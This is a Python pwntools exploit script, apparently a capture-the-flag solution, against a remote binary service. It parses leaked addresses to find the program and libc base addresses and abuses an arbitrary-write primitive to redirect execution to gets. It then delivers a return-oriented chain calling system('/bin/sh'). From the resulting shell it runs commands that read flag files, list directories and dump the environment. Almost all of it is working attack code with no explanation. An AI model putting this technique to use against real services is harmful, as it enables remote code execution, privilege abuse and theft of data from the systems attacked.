from pwn import *

context.log_level = 'info'
context.arch = "amd64"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))




io.recvuntil(b"main: ")
main_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"{main_addr=:#x}")

io.recvuntil(b"var: ")
var_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"{var_addr=:#x}")

io.recvuntil(b"printf: ")
printf_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"{printf_addr=:#x}")

def arb_write(addr, value, again=True):
    io.sendlineafter(b"Where to write?", hex(addr).encode())
    io.sendlineafter(b"What to write?", hex(value).encode())
    io.sendlineafter(b"Write again?", str(1 if again else 0).encode())

def arb_write2(addr, value, again=True, buffer=b""):
    io.sendlineafter(b"Where to write?", hex(addr).encode())
    io.sendlineafter(b"What to write?", hex(value).encode())
    io.sendlineafter(b"Write again?", str(1 if again else 0).encode() + buffer)

def write_list(addr, arr, again=True):
    for i in range(len(arr)):
        if i == len(arr) - 1:
            arb_write(addr + i * 8, arr[i], again)
        else:
            arb_write(addr + i * 8, arr[i])

elf_base = main_addr - 0x00000000014EE
log.success(f"{elf_base=:#x}")

libc_base = printf_addr - 0x60100
log.success(f"{libc_base=:#x}")

gets_addr = libc_base + 0x87080

# gdb.attach(io,api=True, gdbscript=
# """
# # b *$rebase(0x0000013CD)
# b *$rebase(0x000001475)
# """)

pop_rdi = libc_base + 0x000000000010f75b # xx
binsh = libc_base + 0x1cb42f
syst=0x0000000000058750+libc_base

arb_write(elf_base + 0x226a, 0x04)
arb_write(elf_base + 0x226a + 1, 0x20)

write_list(elf_base + 0x226a + 2, [
    0,
    0x1000,
    (gets_addr) - (elf_base + 0x0012E0),
], True)

arb_write2(elf_base + 0x226a + 2 + 8*3, 0, False, flat([
    pop_rdi,
    binsh,
    syst,
]))

sleep(0.5)

io.sendline(b"./submitter")
io.sendline(b"id")
io.sendline(b"cat flag*")
io.sendline(b"cat /flag*")
io.sendline(b"ls /")
io.sendline(b"ls .")
io.sendline(b"env")

# pause()

# arb_write(elf_base + 0x227f, 0xdeadbeefbeef - (elf_base + 00012E0), False)

# gdb.attach(io)

io.interactive()















